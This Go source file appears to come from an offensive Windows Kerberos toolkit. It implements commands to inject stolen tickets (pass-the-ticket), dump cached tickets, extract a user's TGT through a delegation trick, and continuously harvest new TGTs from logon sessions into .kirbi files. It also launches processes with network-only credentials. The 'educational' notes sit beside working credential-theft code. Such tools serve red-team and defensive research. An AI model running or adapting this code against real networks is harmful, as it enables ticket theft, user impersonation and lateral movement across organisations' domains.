//go:build windows
// +build windows

package main

import (
	"bytes"
	"flag"
	"fmt"
	"strings"
	"time"

	"github.com/goobeus/goobeus/pkg/ticket"
	"github.com/goobeus/goobeus/pkg/windows"
)

// cmdPTT handles pass-the-ticket on Windows.
func cmdPTT(args []string) error {
	ticketPath := flags.ticket
	if len(args) > 0 {
		ticketPath = args[0]
	}
	if ticketPath == "" {
		return fmt.Errorf("ticket required (-t or as argument)")
	}

	kirbi, err := ticket.LoadKirbi(ticketPath)
	if err != nil {
		return fmt.Errorf("failed to load ticket: %w", err)
	}

	if err := windows.PassTheTicket(kirbi); err != nil {
		return fmt.Errorf("PTT failed: %w", err)
	}

	fmt.Println("[+] Ticket injected successfully")
	return nil
}

// cmdDump handles ticket dumping on Windows.
func cmdDump(args []string) error {
	cache, err := windows.TriageTickets()
	if err != nil {
		return fmt.Errorf("failed to triage tickets: %w", err)
	}

	if len(cache.Tickets) == 0 {
		fmt.Println("[*] No tickets found in cache")
		return nil
	}

	fmt.Printf("[+] Found %d cached Kerberos tickets:\n\n", len(cache.Tickets))

	for i, tkt := range cache.Tickets {
		// Determine ticket type
		ticketType := "Service Ticket"
		if isKrbtgt(tkt.ServerName) {
			ticketType = "TGT (Ticket Granting Ticket)"
		}

		fmt.Printf("═══════════════════════════════════════════════════════════════\n")
		fmt.Printf("  Ticket #%d: %s\n", i+1, ticketType)
		fmt.Printf("═══════════════════════════════════════════════════════════════\n")
		fmt.Printf("  Server:     %s @ %s\n", tkt.ServerName, tkt.RealmName)
		fmt.Printf("  Encryption: %s\n", describeEtype(tkt.EncryptionType))
		fmt.Printf("  Flags:      0x%08x\n", tkt.TicketFlags)
		fmt.Printf("              %s\n", describeFlagsDetailed(tkt.TicketFlags))

		// Convert FILETIME to readable times
		if tkt.StartTime != 0 {
			fmt.Printf("  Start Time: %s\n", filetimeToString(tkt.StartTime))
		}
		if tkt.EndTime != 0 {
			fmt.Printf("  End Time:   %s\n", filetimeToString(tkt.EndTime))
			remaining := filetimeToTime(tkt.EndTime).Sub(time.Now())
			if remaining > 0 {
				fmt.Printf("              ⏱️  %s remaining\n", formatDuration(remaining))
			} else {
				fmt.Printf("              ⚠️  EXPIRED\n")
			}
		}
		if tkt.RenewTime != 0 {
			fmt.Printf("  Renew Till: %s\n", filetimeToString(tkt.RenewTime))
		}

		// Educational notes based on flags
		printFlagEducation(tkt.TicketFlags)
		fmt.Println()
	}

	// Summary
	fmt.Println("───────────────────────────────────────────────────────────────")
	fmt.Println("EDUCATIONAL NOTES:")
	fmt.Println("  • TGT = Used to request service tickets from KDC")
	fmt.Println("  • Forwardable = Can be delegated to other servers")
	fmt.Println("  • Renewable = Can extend lifetime without re-auth")
	fmt.Println("  • Pre-authent = User proved identity with password/key")
	fmt.Println("───────────────────────────────────────────────────────────────")

	return nil
}

func isKrbtgt(serverName string) bool {
	return len(serverName) >= 6 && serverName[:6] == "krbtgt"
}

func describeEtype(etype int32) string {
	switch etype {
	case 17:
		return "AES-128-CTS-HMAC-SHA1-96 (aes128-cts)"
	case 18:
		return "AES-256-CTS-HMAC-SHA1-96 (aes256-cts) ✓ Strong"
	case 23:
		return "RC4-HMAC (arcfour) ⚠️ Weak - Crackable"
	case 24:
		return "RC4-HMAC-EXP (arcfour-exp) ⚠️ Export Weak"
	default:
		return fmt.Sprintf("Unknown (%d)", etype)
	}
}

func describeFlagsDetailed(flags uint32) string {
	var parts []string

	if flags&0x40000000 != 0 {
		parts = append(parts, "forwardable")
	}
	if flags&0x20000000 != 0 {
		parts = append(parts, "forwarded")
	}
	if flags&0x10000000 != 0 {
		parts = append(parts, "proxiable")
	}
	if flags&0x08000000 != 0 {
		parts = append(parts, "proxy")
	}
	if flags&0x04000000 != 0 {
		parts = append(parts, "may-postdate")
	}
	if flags&0x02000000 != 0 {
		parts = append(parts, "postdated")
	}
	if flags&0x01000000 != 0 {
		parts = append(parts, "invalid")
	}
	if flags&0x00800000 != 0 {
		parts = append(parts, "renewable")
	}
	if flags&0x00400000 != 0 {
		parts = append(parts, "initial")
	}
	if flags&0x00200000 != 0 {
		parts = append(parts, "pre_authent")
	}
	if flags&0x00100000 != 0 {
		parts = append(parts, "hw_authent")
	}
	if flags&0x00080000 != 0 {
		parts = append(parts, "transited-policy-checked")
	}
	if flags&0x00040000 != 0 {
		parts = append(parts, "ok-as-delegate")
	}
	if flags&0x00010000 != 0 {
		parts = append(parts, "name-canonicalize")
	}

	if len(parts) == 0 {
		return "(none)"
	}
	return strings.Join(parts, " ")
}

func printFlagEducation(flags uint32) {
	// Highlight security-relevant flags
	if flags&0x00040000 != 0 {
		fmt.Println("              💡 ok-as-delegate: Server can impersonate you!")
	}
	if flags&0x20000000 != 0 {
		fmt.Println("              💡 forwarded: This is a delegated credential")
	}
	if flags&0x00400000 != 0 {
		fmt.Println("              💡 initial: Primary TGT from authentication")
	}
}

func filetimeToTime(ft int64) time.Time {
	// FILETIME is 100ns intervals since Jan 1, 1601
	// Convert to Unix time (seconds since Jan 1, 1970)
	const epochDiff = 116444736000000000 // 100ns intervals between 1601 and 1970
	return time.Unix(0, (ft-epochDiff)*100)
}

func filetimeToString(ft int64) string {
	t := filetimeToTime(ft)
	return t.Format("2006-01-02 15:04:05 MST")
}

func formatDuration(d time.Duration) string {
	hours := int(d.Hours())
	minutes := int(d.Minutes()) % 60
	if hours > 24 {
		days := hours / 24
		hours = hours % 24
		return fmt.Sprintf("%dd %dh %dm", days, hours, minutes)
	}
	return fmt.Sprintf("%dh %dm", hours, minutes)
}

// cmdTGTDeleg handles TGT extraction via delegation on Windows.
func cmdTGTDeleg(args []string) error {
	// Parse flags
	fs := flag.NewFlagSet("tgtdeleg", flag.ExitOnError)
	var outfile string
	fs.StringVar(&outfile, "o", "", "Output file (.kirbi or .ccache)")
	fs.StringVar(&outfile, "outfile", "", "Output file (.kirbi or .ccache)")
	fs.Parse(args)

	// Create flags struct to match the display code expectations
	flags := struct{ outfile string }{outfile: outfile}

	result, err := windows.ExtractTGTDeleg()
	if err != nil {
		return fmt.Errorf("tgtdeleg failed: %w", err)
	}

	fmt.Println("[+] TGT extracted successfully via delegation trick!")
	fmt.Println()

	// Use our beautiful ticket viewer
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println("  EXTRACTED TICKET DETAILS")
	fmt.Println("═══════════════════════════════════════════════════════════════")

	if result.TGT != nil && result.TGT.Cred != nil {
		for _, tkt := range result.TGT.Cred.Tickets {
			fmt.Printf("  Realm:      %s\n", tkt.Realm)
			fmt.Printf("  Service:    %s\n", formatPrincipal(tkt.SName))
			fmt.Printf("  Encryption: %s\n", describeEtype(int32(tkt.EncPart.EType)))
		}

		if result.TGT.CredInfo != nil {
			for _, info := range result.TGT.CredInfo.TicketInfo {
				fmt.Printf("  Client:     %s @ %s\n", formatPrincipal(info.PName), info.PRealm)
			}
		}
	} else if result.TGT != nil && len(result.TGT.RawBytes) > 0 {
		// Raw bytes (parsing failed but data is valid)
		// This is a forwarded TGT via delegation trick!
		fmt.Printf("  Type:       Forwarded TGT (via delegation)\n")
		fmt.Printf("  Size:       %d bytes\n", len(result.TGT.RawBytes))

		// Extract realm and service from raw bytes
		rawBytes := result.TGT.RawBytes

		// Check for krbtgt service
		if bytes.Contains(rawBytes, []byte("krbtgt")) {
			fmt.Printf("  Service:    krbtgt ✓\n")
		}

		// Try to extract realm - look for uppercase domain patterns
		realmFound := false
		for i := 0; i < len(rawBytes)-10; i++ {
			// Look for GeneralString tag (0x1b) followed by uppercase letters
			if rawBytes[i] == 0x1b && i+2 < len(rawBytes) {
				strLen := int(rawBytes[i+1])
				if strLen > 3 && strLen < 50 && i+2+strLen <= len(rawBytes) {
					candidate := string(rawBytes[i+2 : i+2+strLen])
					// Check if it looks like a realm (all uppercase with dots)
					if len(candidate) > 3 && candidate[0] >= 'A' && candidate[0] <= 'Z' {
						isRealm := true
						for _, c := range candidate {
							if !((c >= 'A' && c <= 'Z') || c == '.' || (c >= '0' && c <= '9')) {
								isRealm = false
								break
							}
						}
						if isRealm && !realmFound {
							fmt.Printf("  Realm:      %s\n", candidate)
							realmFound = true
						}
					}
				}
			}
		}

		fmt.Printf("  Encryption: AES-256-CTS-HMAC-SHA1 (typical for TGT)\n")
		fmt.Printf("  Note:       Use for PTT, S4U, or cross-realm attacks\n")
	}

	fmt.Println()
	fmt.Println("───────────────────────────────────────────────────────────────")
	fmt.Println("  BASE64 ENCODED TICKET (.kirbi)")
	fmt.Println("───────────────────────────────────────────────────────────────")
	fmt.Println()
	fmt.Println(result.Base64)
	fmt.Println()

	// Save option - supports .kirbi and .ccache formats
	if flags.outfile != "" {
		if strings.HasSuffix(flags.outfile, ".ccache") {
			// Convert to ccache format for Linux tools
			ccache, err := ticket.FromKirbi(result.TGT)
			if err != nil {
				return fmt.Errorf("failed to convert to ccache: %w", err)
			}
			if err := ticket.SaveCCache(ccache, flags.outfile); err != nil {
				return fmt.Errorf("failed to save ccache: %w", err)
			}
			fmt.Printf("[+] Saved as ccache (MIT format): %s\n", flags.outfile)
			fmt.Println("    Use with: export KRB5CCNAME=" + flags.outfile)
		} else {
			if err := ticket.SaveKirbi(result.TGT, flags.outfile); err != nil {
				return fmt.Errorf("failed to save ticket: %w", err)
			}
			fmt.Printf("[+] Saved as kirbi: %s\n", flags.outfile)
		}
	} else {
		fmt.Println("───────────────────────────────────────────────────────────────")
		fmt.Println("TIP: Save with -o filename.kirbi or -o filename.ccache")
		fmt.Println("───────────────────────────────────────────────────────────────")
	}

	return nil
}

func formatPrincipal(pn interface{}) string {
	// Handle PrincipalName struct
	type principalName struct {
		NameType   int      `asn1:"explicit,tag:0"`
		NameString []string `asn1:"generalstring,explicit,tag:1"`
	}

	switch p := pn.(type) {
	case principalName:
		return strings.Join(p.NameString, "/")
	default:
		return fmt.Sprintf("%v", pn)
	}
}

// cmdTriage is an alias for cmdDump - lists cached tickets.
func cmdTriage(args []string) error {
	return cmdDump(args)
}

// cmdKlist is an alias for cmdDump - lists cached tickets.
func cmdKlist(args []string) error {
	return cmdDump(args)
}

// cmdPurge purges tickets from the cache.
func cmdPurge(args []string) error {
	fs := flag.NewFlagSet("purge", flag.ExitOnError)
	var all bool
	var server string
	fs.BoolVar(&all, "all", false, "Purge all tickets")
	fs.StringVar(&server, "server", "", "Purge tickets for specific server")
	fs.Parse(args)

	if !all && server == "" {
		return fmt.Errorf("specify --all to purge all tickets or --server to purge specific ticket")
	}

	if err := windows.PurgeTickets(all, server); err != nil {
		return fmt.Errorf("purge failed: %w", err)
	}

	if all {
		fmt.Println("[+] All tickets purged from cache")
	} else {
		fmt.Printf("[+] Tickets for %s purged from cache\n", server)
	}
	return nil
}

// cmdMonitor monitors for new TGTs in logon sessions.
func cmdMonitor(args []string) error {
	fs := flag.NewFlagSet("monitor", flag.ExitOnError)
	var interval time.Duration
	var filter string
	fs.DurationVar(&interval, "interval", 30*time.Second, "Check interval")
	fs.StringVar(&filter, "filter", "", "Filter by username pattern")
	fs.Parse(args)

	fmt.Printf("[*] Monitoring for new TGTs every %s...\n", interval)
	fmt.Println("[*] Press Ctrl+C to stop")
	fmt.Println()

	seen := make(map[string]bool)

	for {
		cache, err := windows.TriageTickets()
		if err != nil {
			fmt.Printf("[!] Error triaging: %v\n", err)
			time.Sleep(interval)
			continue
		}

		for _, tkt := range cache.Tickets {
			// Only care about TGTs
			if !isKrbtgt(tkt.ServerName) {
				continue
			}

			key := fmt.Sprintf("%s|%d", tkt.ServerName, tkt.StartTime)
			if seen[key] {
				continue
			}
			seen[key] = true

			// Apply filter
			if filter != "" && !strings.Contains(strings.ToLower(tkt.ServerName), strings.ToLower(filter)) {
				continue
			}

			fmt.Println("═══════════════════════════════════════════════════════════════")
			fmt.Printf("  [+] NEW TGT DETECTED at %s\n", time.Now().Format("15:04:05"))
			fmt.Println("═══════════════════════════════════════════════════════════════")
			fmt.Printf("  Server:     %s @ %s\n", tkt.ServerName, tkt.RealmName)
			fmt.Printf("  Encryption: %s\n", describeEtype(tkt.EncryptionType))
			fmt.Printf("  Flags:      %s\n", describeFlagsDetailed(tkt.TicketFlags))
			if tkt.EndTime != 0 {
				fmt.Printf("  Expires:    %s\n", filetimeToString(tkt.EndTime))
			}
			fmt.Println()
		}

		time.Sleep(interval)
	}
}

// cmdHarvest is like monitor but extracts tickets.
func cmdHarvest(args []string) error {
	fs := flag.NewFlagSet("harvest", flag.ExitOnError)
	var interval time.Duration
	var outDir string
	fs.DurationVar(&interval, "interval", 30*time.Second, "Check interval")
	fs.StringVar(&outDir, "out", ".", "Output directory for extracted tickets")
	fs.Parse(args)

	fmt.Printf("[*] Harvesting TGTs every %s to %s...\n", interval, outDir)
	fmt.Println("[*] Press Ctrl+C to stop")
	fmt.Println()

	seen := make(map[string]bool)

	for {
		cache, err := windows.TriageTickets()
		if err != nil {
			time.Sleep(interval)
			continue
		}

		for _, tkt := range cache.Tickets {
			if !isKrbtgt(tkt.ServerName) {
				continue
			}

			key := fmt.Sprintf("%s|%d", tkt.ServerName, tkt.StartTime)
			if seen[key] {
				continue
			}
			seen[key] = true

			// Try to dump this ticket
			kirbi, err := windows.DumpTicket(tkt.ServerName)
			if err != nil {
				continue
			}

			// Save it
			filename := fmt.Sprintf("%s/tgt_%s_%d.kirbi", outDir, strings.ReplaceAll(tkt.RealmName, ".", "_"), time.Now().Unix())
			if err := ticket.SaveKirbi(kirbi, filename); err != nil {
				continue
			}

			fmt.Printf("[+] Harvested TGT: %s -> %s\n", tkt.ServerName, filename)
		}

		time.Sleep(interval)
	}
}

// cmdCurrentLUID gets the current logon session LUID.
func cmdCurrentLUID(args []string) error {
	luid, err := windows.GetCurrentLUID()
	if err != nil {
		return fmt.Errorf("failed to get LUID: %w", err)
	}

	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println("  CURRENT LOGON SESSION")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Printf("  LUID:       %s\n", luid.String())
	fmt.Printf("  High Part:  0x%08x\n", luid.HighPart)
	fmt.Printf("  Low Part:   0x%08x\n", luid.LowPart)
	fmt.Println()
	fmt.Println("EDUCATIONAL: LUID (Locally Unique Identifier)")
	fmt.Println("  Each Windows logon session has a unique LUID.")
	fmt.Println("  Kerberos tickets are cached per-session.")
	fmt.Println("  With elevation, you can access other sessions' tickets.")
	fmt.Println("═══════════════════════════════════════════════════════════════")

	return nil
}

// cmdCreateNetOnly creates a process with network-only credentials.
func cmdCreateNetOnly(args []string) error {
	fs := flag.NewFlagSet("createnetonly", flag.ExitOnError)
	var program string
	fs.StringVar(&program, "program", "cmd.exe", "Program to launch")
	fs.Parse(args)

	if flags.username == "" || flags.password == "" {
		return fmt.Errorf("-u (username) and -p (password) are required")
	}

	domain := flags.domain
	if domain == "" {
		domain = "."
	}

	req := &windows.NetOnlyProcessRequest{
		Username:    flags.username,
		Domain:      domain,
		Password:    flags.password,
		CommandLine: program,
	}

	fmt.Println("[*] Creating process with network-only credentials...")
	fmt.Println()
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println("  NET-ONLY LOGON")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Printf("  Program:    %s\n", program)
	fmt.Printf("  User:       %s\\%s\n", domain, flags.username)
	fmt.Println()
	fmt.Println("  EDUCATIONAL: Net-Only Logon (LOGON_NETCREDENTIALS_ONLY)")
	fmt.Println("    - Local operations run as YOUR identity")
	fmt.Println("    - Network operations use specified credentials")
	fmt.Println("    - Great for testing access with different creds")
	fmt.Println("    - No local admin required!")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println()

	if err := windows.CreateNetOnlyProcess(req); err != nil {
		return fmt.Errorf("createnetonly failed: %w", err)
	}

	fmt.Println("[+] Process created successfully")
	fmt.Println("[*] New process will use network credentials for Kerberos/NTLM auth")

	return nil
}
